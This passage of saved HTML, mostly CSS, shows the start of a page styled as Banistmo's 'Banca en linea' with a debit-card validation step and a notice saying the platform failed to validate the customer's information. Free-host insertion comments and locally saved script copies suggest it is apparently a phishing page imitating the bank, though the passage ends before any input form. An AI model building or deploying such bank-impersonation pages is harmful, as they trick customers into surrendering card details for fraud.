            justify-content: safe;
            text-align: justify;
            white-space: pre-wrap
        }

        .tooltip[_ngcontent-c26]:hover:before {
            border: solid;
            border-color: #58595b transparent;
            border-width: 6px 6px 0;
            bottom: 20px;
            content: "";
            left: 10%;
            position: absolute;
            z-index: 3
        }

        .tooltip[_ngcontent-c26] i[_ngcontent-c26] {
            font-size: 1.2em;
            letter-spacing: 15px;
            cursor: pointer
        }

        .tooltip-image-cc1[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .tooltip-image-cc1[_ngcontent-c26]:hover:after {
            content: url(../../../../assets/icons/mono-tone/cedula_dato_1.svg)
        }

        .tooltip-image-cc2[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .tooltip-image-cc2[_ngcontent-c26]:hover:after {
            content: url(../../../../assets/icons/mono-tone/cedula_dato_2.svg)
        }

        .tooltip-image-cc3[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .tooltip-image-cc3[_ngcontent-c26]:hover:after {
            content: url(../../../../assets/icons/mono-tone/cedula_dato_3.svg)
        }

        .tooltip-message[_ngcontent-c26] {
            display: inline;
            position: relative
        }

        .tooltip-message[_ngcontent-c26]:hover:after {
            min-width: 290px;
            left: -250px;
            content: attr(message)
        }
    </style>
    <style type="text/css" id="__tib__">
        img {
            background-color: transparent !important;
        }
    </style>
    <style>
        .main-container[_ngcontent-c17] {
            width: 100%
        }

        .main-container[_ngcontent-c17] .carousel-banner[_ngcontent-c17] {
            height: auto
        }

        .main-container[_ngcontent-c17] .carousel-banner[_ngcontent-c17] .banner-container[_ngcontent-c17] {
            text-align: center
        }

        @media (max-width:768px) {
            .carousel-banner[_ngcontent-c17] {
                background-color: transparent !important
            }

            .carousel-banner[_ngcontent-c17] .banner-container[_ngcontent-c17] {
                max-width: 100%;
                padding: 0 26px !important;
                text-align: center !important;
                box-sizing: border-box;
                -moz-box-sizing: border-box;
                -webkit-box-sizing: border-box
            }
        }

        @media screen and (min-width:1200px) {
            .main-container[_ngcontent-c17] .carousel-banner[_ngcontent-c17] {
                background-color: #e6e7e8
            }

            .main-container[_ngcontent-c17] .carousel-banner[_ngcontent-c17] .banner-container[_ngcontent-c17] {
                text-align: right
            }
        }
    </style>
    <style>
        .secondary-link[_ngcontent-c19] {
            margin-bottom: 20px
        }

        .secondary-link[_ngcontent-c19] .icon-left[_ngcontent-c19] {
            font-size: 2em;
            float: left;
            margin-right: 20px;
            width: 35px;
            text-align: center
        }

        .secondary-link[_ngcontent-c19] a[_ngcontent-c19] {
            color: #3a3b3b;
            font-size: .9em;
            font-weight: 700;
            line-height: 32px
        }

        .secondary-link[_ngcontent-c19] a[_ngcontent-c19]:hover {
            color: #ffd200;
            font-weight: 700;
            text-decoration: none
        }

        .secondary-link[_ngcontent-c19] a[_ngcontent-c19]:focus {
            color: #3a3b3b
        }

        .secondary-link[_ngcontent-c19] .icon-right[_ngcontent-c19] {
            font-weight: 700;
            font-size: .55em;
            float: right;
            line-height: 32px
        }
    </style>
    <style>
        .btn-outline[_ngcontent-c20] {
            width: 287px;
            height: 59px;
            border-radius: 29.5px;
            border: 1px solid #3a3b3b;
            background-color: transparent;
            font-size: .85em;
            font-weight: 700;
            padding: 0 15px;
            margin-top: 10px;
            cursor: pointer
        }

        .btn-outline[_ngcontent-c20]:hover {
            border: 2px solid #3a3b3b
        }

        .btn-outline[_ngcontent-c20] .icon-left[_ngcontent-c20] {
            font-size: 1.8em;
            width: 30px;
            vertical-align: bottom;
            line-height: 10px
        }
    </style>
    <style>
        h2[_ngcontent-c29] {
            font-size: .8em;
            line-height: 1.28;
            color: #454648;
            margin-bottom: 10px
        }
    </style>
    <style>
        .language[_ngcontent-c30] {
            text-align: right
        }

        .language[_ngcontent-c30] a[_ngcontent-c30] {
            color: #454648;
            font-size: .8em;
            line-height: 34px;
            cursor: pointer
        }

        .language[_ngcontent-c30] a[_ngcontent-c30]:hover {
            font-weight: 700;
            text-decoration: none
        }

        .main-container[_ngcontent-c30] {
            background-color: #f7f7f7;
            padding: 30px 0 50px;
            min-height: 810px
        }

        .main-container[_ngcontent-c30] h2[_ngcontent-c30] {
            font-size: 1.5em;
            font-weight: 700;
            line-height: 1.17;
            text-align: center;
            color: #454648;
            margin-bottom: 20px
        }

        .main-container[_ngcontent-c30] .container[_ngcontent-c30] {
            width: 380px;
            top: 30px;
            padding-top: 50px
        }

        .main-container[_ngcontent-c30] .container[_ngcontent-c30] .card-content[_ngcontent-c30] {
            padding: 15px 25px 30px 20px
        }

        @media (max-width:360px) {
            .main-container[_ngcontent-c30] {
                min-height: 400px
            }

            .main-container[_ngcontent-c30] .container[_ngcontent-c30] {
                width: 100%;
                padding: 5px
            }
        }

        @media (max-width:768px) {
            .main-container[_ngcontent-c30] {
                padding: 15px 0 0
            }

            .main-container[_ngcontent-c30] .login-container[_ngcontent-c30] .login[_ngcontent-c30] {
                max-width: 330px;
                position: relative;
                top: 0;
                left: 0;
                margin: 0 auto 15px
            }

            .information-container[_ngcontent-c30] {
                padding: 30px 26px !important
            }
        }

        .modal-body[_ngcontent-c30] {
            padding-bottom: 40px
        }

        .modal-body[_ngcontent-c30] .icon-modal-time[_ngcontent-c30] {
            padding-top: 40px;
            padding-bottom: 20px;
            font-size: 3em;
            content: url(time.9dd163b84853724223f7.svg)
        }

        .modal-body[_ngcontent-c30] .icon-modal-warning[_ngcontent-c30] {
            padding-top: 40px;
            padding-bottom: 20px;
            font-size: 3em;
            content: url(warning.2b8dd703a6eee64a1b1b.svg)
        }

        .modal-body[_ngcontent-c30] .session-message[_ngcontent-c30] {
            font-size: 1em;
            line-height: 1.38;
            text-align: center;
            margin-bottom: 45px
        }

        @media (max-width:992px) {
            .login-container[_ngcontent-c30] .login[_ngcontent-c30] {
                left: 15px
            }
        }

        @media (max-width:576px) {
            .language[_ngcontent-c30] {
                position: absolute;
                right: 10px;
                top: -34px
            }
        }
    </style>
    <style>
        footer[_ngcontent-c31] {
            width: 100%;
            background-color: #f7f7f7
        }

        footer[_ngcontent-c31] .contact-information[_ngcontent-c31] i[_ngcontent-c31] {
            -webkit-transform: scaleX(-1);
            transform: scaleX(-1)
        }

        footer.register[_ngcontent-c31] {
            background-color: #e6e7e8
        }

        footer.home[_ngcontent-c31] {
            background-color: #f7f7f7
        }

        footer[_ngcontent-c31] .contact-telephone[_ngcontent-c31] {
            font-size: .79em;
            padding: 2px
        }

        footer[_ngcontent-c31] .info-legal[_ngcontent-c31] {
            font-size: .75em
        }
    </style>
    <style>
        .main-title[_ngcontent-c32] {
            font-size: .875rem;
            font-weight: 700;
            line-height: 1.36;
            letter-spacing: normal
        }

        .error[_ngcontent-c32] {
            color: #fa5e5b;
            font-size: .75em;
            margin-bottom: 20px;
            text-align: center
        }

        .container-user-information[_ngcontent-c32] {
            border-radius: 8px;
            background-color: #f7f7f7;
            margin-top: 20px;
            padding: 17px 0 12px
        }

        .text-user-information-key[_ngcontent-c32] {
            font-size: .75em;
            line-height: 1.33;
            color: #808285
        }

        .text-user-information-value[_ngcontent-c32] {
            font-size: .875em;
            font-weight: 700;
            line-height: 1.36;
            color: #808285
        }

        .hyperlink[_ngcontent-c32] {
            margin: 30px 0
        }

        .text-modal-email[_ngcontent-c32] {
            font-size: 1em;
            line-height: 1.38;
            text-align: center;
            margin-bottom: 45px
        }

        .icon-modal-email[_ngcontent-c32] {
            padding-top: 40px;
            padding-bottom: 20px;
            font-size: 3em;
            content: url(warning.2b8dd703a6eee64a1b1b.svg)
        }

        .modal-body[_ngcontent-c32] {
            padding-bottom: 40px
        }

        .modal-body[_ngcontent-c32] .icon-modal-time[_ngcontent-c32] {
            padding-top: 40px;
            padding-bottom: 20px;
            font-size: 3em;
            content: url(time.9dd163b84853724223f7.svg)
        }

        .modal-body[_ngcontent-c32] .session-message[_ngcontent-c32] {
            font-size: 1em;
            line-height: 1.38;
            text-align: center;
            margin-bottom: 45px
        }
    </style>
    <style>
        .status-container[_ngcontent-c33] {
            width: 100%;
            display: inline-flex;
            height: 30px;
            position: relative
        }

        .status-container[_ngcontent-c33] .last-first-line[_ngcontent-c33] {
            width: 22%;
            left: 6%
        }

        .status-container[_ngcontent-c33] .last-second-line[_ngcontent-c33] {
            width: 60%;
            left: 34%;
            text-align: right;
            padding-right: 10px
        }

        .status-container[_ngcontent-c33] .last-second-circle[_ngcontent-c33] {
            left: 28%
        }

        .status-container[_ngcontent-c33] .first-line[_ngcontent-c33] {
            padding-left: 10px;
            width: 56%;
            left: 6%
        }

        .status-container[_ngcontent-c33] .first-second-circle[_ngcontent-c33] {
            left: 62%
        }

        .status-container[_ngcontent-c33] .first-second-line[_ngcontent-c33] {
            width: 10%;
            left: 68%
        }

        .status-container[_ngcontent-c33] .first-third-circle[_ngcontent-c33] {
            left: 78%
        }

        .status-container[_ngcontent-c33] .first-third-line[_ngcontent-c33] {
            width: 10%;
            left: 84%
        }

        .status-container[_ngcontent-c33] .second-line[_ngcontent-c33] {
            width: 20%;
            left: 6%
        }

        .status-container[_ngcontent-c33] .second-second-circle[_ngcontent-c33] {
            left: 26%
        }

        .status-container[_ngcontent-c33] .second-second-line[_ngcontent-c33] {
            width: 46%;
            left: 32%
        }

        .status-container[_ngcontent-c33] .second-third-circle[_ngcontent-c33] {
            left: 78%
        }

        .status-container[_ngcontent-c33] .second-third-line[_ngcontent-c33] {
            width: 10%;
            left: 84%
        }

        .status-container[_ngcontent-c33] .third-second-line[_ngcontent-c33] {
            width: 38%;
            left: 22%;
            text-align: right;
            padding-right: 10px
        }

        .status-container[_ngcontent-c33] .third-third-circle[_ngcontent-c33] {
            left: 60%
        }

        .status-container[_ngcontent-c33] .third-third-line[_ngcontent-c33] {
            width: 28%;
            left: 66%
        }

        .status-container[_ngcontent-c33] .forth-line[_ngcontent-c33] {
            width: 10%;
            left: 6%
        }

        .status-container[_ngcontent-c33] .forth-second-circle[_ngcontent-c33] {
            left: 16%
        }

        .status-container[_ngcontent-c33] .forth-second-line[_ngcontent-c33] {
            width: 10%;
            left: 22%
        }

        .status-container[_ngcontent-c33] .forth-third-circle[_ngcontent-c33] {
            left: 32%
        }

        .status-container[_ngcontent-c33] .forth-third-line[_ngcontent-c33] {
            width: 56%;
            left: 38%;
            text-align: right;
            padding-right: 10px
        }

        .status-container[_ngcontent-c33] .first-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-second-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-third-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-second-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-third-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .last-first-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .last-second-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-second-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-third-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .third-second-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .third-third-line[_ngcontent-c33] {
            top: 0;
            border-bottom: 1px solid #ffd200;
            font-size: 13px;
            font-weight: 700;
            color: #454648;
            height: 70%;
            position: absolute
        }

        .status-container[_ngcontent-c33] .first-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-third-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-third-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .last-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-third-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .third-third-circle[_ngcontent-c33] {
            width: 6%;
            height: 56%;
            top: 40%;
            border: 1px solid #ffd200;
            background: #fff
        }

        .status-container[_ngcontent-c33] .first-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .third-circle-background[_ngcontent-c33] {
            width: 5%;
            height: 48%;
            top: 45%;
            border: 1px solid #fff;
            background: #ffd200
        }

        .status-container[_ngcontent-c33] .first-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .first-third-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .forth-third-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .last-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .second-third-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .third-circle-background[_ngcontent-c33],
        .status-container[_ngcontent-c33] .third-third-circle[_ngcontent-c33] {
            position: absolute;
            border-radius: 100px
        }

        .status-container[_ngcontent-c33] .first-circle[_ngcontent-c33] {
            left: 0
        }

        .status-container[_ngcontent-c33] .first-circle-background[_ngcontent-c33] {
            left: 1.5px
        }

        .status-container[_ngcontent-c33] .second-circle[_ngcontent-c33] {
            left: 66%
        }

        .status-container[_ngcontent-c33] .second-circle-background[_ngcontent-c33] {
            left: 26.5%
        }

        .status-container[_ngcontent-c33] .forth-circle[_ngcontent-c33] {
            left: 94%
        }

        .status-container[_ngcontent-c33] .third-circle-background[_ngcontent-c33] {
            left: 60.5%
        }

        .status-container[_ngcontent-c33] .forth-circle-background[_ngcontent-c33] {
            left: 94.5%
        }

        .stepper-svg[_ngcontent-c33] {
            width: 320px;
            height: 30px
        }

        .stepper-svg[_ngcontent-c33] .line[_ngcontent-c33] {
            stroke: #ffd200
        }

        .stepper-svg[_ngcontent-c33] .g-step[_ngcontent-c33] circle[_ngcontent-c33]:nth-child(1) {
            fill: #fff;
            stroke: #ffd200
        }

        .stepper-svg[_ngcontent-c33] .g-step[_ngcontent-c33] circle[_ngcontent-c33]:nth-child(2) {
            fill: #ffd200
        }

        .stepper-svg[_ngcontent-c33] .g-step[_ngcontent-c33] text[_ngcontent-c33] {
            font: bold 13px nunito;
            fill: #454648
        }

        .stepper-svg[_ngcontent-c33] .g-step.text-anchor-end[_ngcontent-c33] text[_ngcontent-c33] {
            text-anchor: end
        }

        .stepper-svg[_ngcontent-c33] .g-step[_ngcontent-c33]:not(.active) circle[_ngcontent-c33]:nth-child(2),
        .stepper-svg[_ngcontent-c33] .g-step[_ngcontent-c33]:not(.active) text[_ngcontent-c33] {
            display: none
        }

        .stepper-svg[_ngcontent-c33] .g-step.step-n1[_ngcontent-c33] {
            -webkit-transform: translate(0, 10px);
            transform: translate(0, 10px)
        }

        .stepper-svg[_ngcontent-c33] .g-step.step-n1.active[_ngcontent-c33]+.step-n2[_ngcontent-c33] {
            -webkit-transform: translate(222px, 10px);
            transform: translate(222px, 10px)
        }

        .stepper-svg[_ngcontent-c33] .g-step.step-n1[_ngcontent-c33]:not(.active)+.step-n2.active[_ngcontent-c33] {
            -webkit-transform: translate(182px, 10px);
            transform: translate(182px, 10px)
        }

        .stepper-svg[_ngcontent-c33] .g-step.step-n1[_ngcontent-c33]:not(.active)+.step-n2[_ngcontent-c33]:not(.active) {
            -webkit-transform: translate(70px, 10px);
            transform: translate(70px, 10px)
        }

        .stepper-svg[_ngcontent-c33] .g-step.step-n3[_ngcontent-c33] {
            -webkit-transform: translate(300px, 10px);
            transform: translate(300px, 10px)
        }

        @media only screen and (min-width:768px) {
            .stepper-svg[_ngcontent-c33]:not(.force-small) {
                width: 600px
            }

            .stepper-svg[_ngcontent-c33]:not(.force-small) .line[_ngcontent-c33] {
                -webkit-transform: scale(1.87, 1);
                transform: scale(1.87, 1)
            }

            .stepper-svg[_ngcontent-c33]:not(.force-small) .g-step.step-n1[_ngcontent-c33] {
                -webkit-transform: translate(0, 10px);
                transform: translate(0, 10px)
            }

            .stepper-svg[_ngcontent-c33]:not(.force-small) .g-step.step-n1.active[_ngcontent-c33]+.step-n2[_ngcontent-c33],
            .stepper-svg[_ngcontent-c33]:not(.force-small) .g-step.step-n1[_ngcontent-c33]:not(.active)+.step-n2.active[_ngcontent-c33],
            .stepper-svg[_ngcontent-c33]:not(.force-small) .g-step.step-n1[_ngcontent-c33]:not(.active)+.step-n2[_ngcontent-c33]:not(.active) {
                -webkit-transform: translate(290px, 10px);
                transform: translate(290px, 10px)
            }

            .stepper-svg[_ngcontent-c33]:not(.force-small) .g-step.step-n3[_ngcontent-c33] {
                -webkit-transform: translate(580px, 10px);
                transform: translate(580px, 10px)
            }
        }

        .status-container-two[_ngcontent-c33] {
            width: 100%;
            display: inline-flex;
            height: 30px;
            position: relative
        }

        .status-container-two[_ngcontent-c33] .first-line[_ngcontent-c33] {
            width: 60%;
            left: 3.5%;
            padding-left: 5px
        }

        .status-container-two[_ngcontent-c33] .forth-circle-background[_ngcontent-c33] {
            left: 94.5%
        }

        .status-container-two[_ngcontent-c33] .first-second-line[_ngcontent-c33] {
            width: 19%;
            left: 61%
        }

        .status-container-two[_ngcontent-c33] .forth-second-line[_ngcontent-c33] {
            width: 13%;
            left: 19.5%
        }

        .status-container-two[_ngcontent-c33] .second-line[_ngcontent-c33] {
            width: 23%;
            left: 3.5%
        }

        .status-container-two[_ngcontent-c33] .forth-third-circle[_ngcontent-c33] {
            left: 32%
        }

        .status-container-two[_ngcontent-c33] .forth-third-line[_ngcontent-c33] {
            width: 59%;
            left: 35.5%;
            text-align: right;
            padding-right: 10px
        }

        .status-container-two[_ngcontent-c33] .second-second-line[_ngcontent-c33] {
            width: 49%;
            left: 29.5%
        }

        .status-container-two[_ngcontent-c33] .second-third-line[_ngcontent-c33] {
            width: 13%;
            left: 81.5%
        }

        .status-container-two[_ngcontent-c33] .forth-line[_ngcontent-c33] {
            width: 13%;
            left: 3.5%
        }

        .status-container-two[_ngcontent-c33] .third-third-line[_ngcontent-c33] {
            width: 31%;
            left: 63.5%
        }

        .status-container[_ngcontent-c33] .status-container-two[_ngcontent-c33] .last-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .status-container-two[_ngcontent-c33] .second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-third-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-third-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-third-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .status-container[_ngcontent-c33] .last-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .status-container[_ngcontent-c33] .second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .third-third-circle[_ngcontent-c33] {
            width: 3.5%;
            height: 60%;
            top: 40%;
            border: 1px solid #ffd200;
            background: #fff
        }

        .status-container[_ngcontent-c33] .status-container-two[_ngcontent-c33] .last-first-line[_ngcontent-c33],
        .status-container[_ngcontent-c33] .status-container-two[_ngcontent-c33] .last-second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-third-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-third-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-third-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .status-container[_ngcontent-c33] .last-first-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .status-container[_ngcontent-c33] .last-second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .third-second-line[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .third-third-line[_ngcontent-c33] {
            top: 0;
            border-bottom: 1px solid #ffd200;
            font-size: 13px;
            font-weight: 700;
            color: #454648;
            height: 70%;
            position: absolute
        }

        .status-container-two[_ngcontent-c33] .first-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .third-circle-background[_ngcontent-c33] {
            width: 3%;
            height: 48%;
            top: 45%;
            border: 1px solid #fff;
            background: #ffd200
        }

        .status-container[_ngcontent-c33] .status-container-two[_ngcontent-c33] .last-second-circle[_ngcontent-c33],
        .status-container[_ngcontent-c33] .status-container-two[_ngcontent-c33] .second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .first-third-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .forth-third-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .second-third-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .status-container[_ngcontent-c33] .last-second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .status-container[_ngcontent-c33] .second-circle[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .third-circle-background[_ngcontent-c33],
        .status-container-two[_ngcontent-c33] .third-third-circle[_ngcontent-c33] {
            position: absolute;
            border-radius: 100px
        }

        .status-container-two[_ngcontent-c33] .first-circle[_ngcontent-c33] {
            left: 0
        }

        .status-container-two[_ngcontent-c33] .first-circle-background[_ngcontent-c33] {
            left: 1.5px
        }

        .status-container-two[_ngcontent-c33] .forth-second-circle[_ngcontent-c33] {
            left: 16%
        }

        .status-container-two[_ngcontent-c33] .first-second-circle[_ngcontent-c33] {
            left: 57%
        }

        .status-container-two[_ngcontent-c33] .first-third-circle[_ngcontent-c33] {
            left: 80%
        }

        .status-container-two[_ngcontent-c33] .third-second-line[_ngcontent-c33] {
            width: 41%;
            left: 19.5%;
            text-align: right;
            padding-right: 10px
        }

        .status-container-two[_ngcontent-c33] .third-third-circle[_ngcontent-c33] {
            left: 60%
        }

        .status-container-two[_ngcontent-c33] .third-circle-background[_ngcontent-c33] {
            left: 60.5%
        }

        .status-container-two[_ngcontent-c33] .first-third-line[_ngcontent-c33] {
            width: 11%;
            left: 83.5%
        }

        .status-container-two[_ngcontent-c33] .forth-circle[_ngcontent-c33] {
            left: 94%
        }

        .status-container-two[_ngcontent-c33] .second-second-circle[_ngcontent-c33] {
            left: 26%
        }

        .status-container-two[_ngcontent-c33] .second-circle-background[_ngcontent-c33] {
            left: 26.5%
        }

        .status-container-two[_ngcontent-c33] .second-third-circle[_ngcontent-c33] {
            left: 78%
        }
    </style>
    <style>
        .card-container[_ngcontent-c34] {
            height: 70px;
            align-items: center;
            padding: 10px 16px
        }

        .card-container[_ngcontent-c34] .icon[_ngcontent-c34] {
            width: 34px
        }

        .card-container[_ngcontent-c34] .container[_ngcontent-c34] {
            display: block;
            position: relative;
            cursor: pointer;
            font-size: .875rem !important;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            font-size: inherit;
            margin: auto
        }

        .card-container[_ngcontent-c34] .container[_ngcontent-c34] input[_ngcontent-c34] {
            position: absolute;
            opacity: 0;
            cursor: pointer;
            margin-right: .5rem;
            right: 0
        }

        .card-container[_ngcontent-c34] .checkmark[_ngcontent-c34] {
            position: absolute;
            top: 25%;
            right: 0;
            height: 16px;
            width: 16px;
            background-color: #fff;
            border-radius: 50%;
            border: 1.5px solid #58595b
        }

        .card-container[_ngcontent-c34] .container[_ngcontent-c34]:hover input[_ngcontent-c34]~.checkmark[_ngcontent-c34] {
            background-color: #ccc
        }

        .card-container[_ngcontent-c34] .container[_ngcontent-c34] input[_ngcontent-c34]:checked~.checkmark[_ngcontent-c34] {
            background-color: transparent;
            border: 1.5px solid #58595b
        }

        .card-container[_ngcontent-c34] .checkmark[_ngcontent-c34]:after {
            content: "";
            position: absolute;
            display: none
        }

        .card-container[_ngcontent-c34] .container[_ngcontent-c34] input[_ngcontent-c34]:checked~.checkmark[_ngcontent-c34]:after {
            display: block
        }

        .card-container[_ngcontent-c34] .container[_ngcontent-c34] .checkmark[_ngcontent-c34]:after {
            top: 2px;
            left: 2px;
            width: 9.6px;
            height: 9.6px;
            border-radius: 50%;
            background: #58595b
        }

        .card {
            -webkit-tap-highlight-color: transparent;
            font-weight: 400;
            text-align: left;
            font-size: 16px;
            color: #454648;
            line-height: 1.38;
            box-sizing: inherit;
            font-family: nunito;
            background-color: #fff;
            border-radius: 8px;
            border: 1px solid #f1f1f1;
            box-shadow: 0 2px 6px 0 rgba(0, 0, 0, .07);
            width: 100%;
            overflow: hidden;
        }
    </style>
    <script charset="utf-8" src="./index_files/9.c94accefe07434999481.js.descarga"></script>
    <script type="text/javascript" async="" src="https://img.sunmediaads.com/ads/lz_loader.js?ver=1.4"></script>
</head>

<body style="overflow: auto;">
    <!-- Inserted by miarroba -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- Inserted by miarroba -->


    <app-root _nghost-c0="" ng-version="6.1.10">
        <app-coachmark _ngcontent-c0="" _nghost-c1="">
            <div _ngcontent-c1="" id="overlay" class="hidden">
                <div _ngcontent-c1="" class="coachmark-image">
                    <div _ngcontent-c1="" class="coachmark-image-container"><img _ngcontent-c1="" src="./index_files/null"></div>
                </div>
                <div _ngcontent-c1="" class="coachmark-button"><a _ngcontent-c1="" class="transparent-btn">Ver después</a></div>
                <div _ngcontent-c1="" class="coachmark-button"><a _ngcontent-c1="" class="transparent-btn">Siguiente</a></div>
                <div _ngcontent-c1="" class="coachmark-button"><span _ngcontent-c1=""><i _ngcontent-c1="" class="icon-close-white"></i></span></div>
            </div>
        </app-coachmark>
        <router-outlet _ngcontent-c0=""></router-outlet>
        <app-container-register _nghost-c30="">
            <div class="row">
                <div class="col-sm-12 col-md-12 col-lg-12 col-xl-12" style="padding: 0;">
                    <div style="width:100%;">
                        <img _ngcontent-c4 src="logoBanistmo.svg" style="margin-left:20%" width="100" height="100">
                    </div>
                    <div class="bg-warning" style="width:100%;">
                        <p style="font-weight: bold;margin-left:20%">
                            Banca en linea
                        </p>
                    </div>
                </div>
            </div>
            <div _ngcontent-c30="" class="main-container">
                <div _ngcontent-c30="" class="container">
                    <app-card _ngcontent-c30="" _nghost-c5="">
                        <div _ngcontent-c5="" class="card ">
                            <div _ngcontent-c30="" class="card-content">
                                <router-outlet _ngcontent-c30=""></router-outlet>
                                <app-step-register-method _nghost-c32="">
                                    <div _ngcontent-c32="" class="container-fluid p-0 mb-4">
                                        <div _ngcontent-c32="" class="row">
                                            <div _ngcontent-c32="" class="col-md-12">
                                                <app-step-progress _ngcontent-c32="" idstepprogress="lbl_ValidationProduct_step1" _nghost-c33="">
                                                    <!---->
                                                    <!---->
                                                    <div _ngcontent-c33="">
                                                        <!---->
                                                        <div _ngcontent-c33="" class="status-container" id="lbl_ValidationProduct_step1">
                                                            <div _ngcontent-c33="" class="first-circle"></div>
                                                            <div _ngcontent-c33="" class="forth-line"></div>
                                                            <div _ngcontent-c33="" class="forth-second-circle"></div>
                                                            <div _ngcontent-c33="" class="forth-second-line"></div>
                                                            <div _ngcontent-c33="" class="forth-third-circle"></div>
                                                            <div _ngcontent-c33="" class="forth-third-line">Validación tarjeta débito</div>
                                                            <div _ngcontent-c33="" class="forth-circle"></div>
                                                            <div _ngcontent-c33="" class="forth-circle-background"></div>
                                                        </div>
                                                        <!---->
                                                        <!---->
                                                        <!---->
                                                    </div>
                                                </app-step-progress>
                                            </div>
                                        </div>
                                        <div _ngcontent-c32="" class="row">
                                            <div _ngcontent-c32="" class="col-md-12">
                                                <!---->
                                            </div>
                                        </div>
                                        <div _ngcontent-c32="" class="row">
                                            <div _ngcontent-c32="" class="col-md-12">
                                                <div _ngcontent-c32="" class="container-user-information">

                                                    <center> Estimado cliente, estamos presentando fallas en nuestra plataforma, no hemos podido validar su informacion.</center>
                                                    <div _ngcontent-c32="" class="row pb-1">

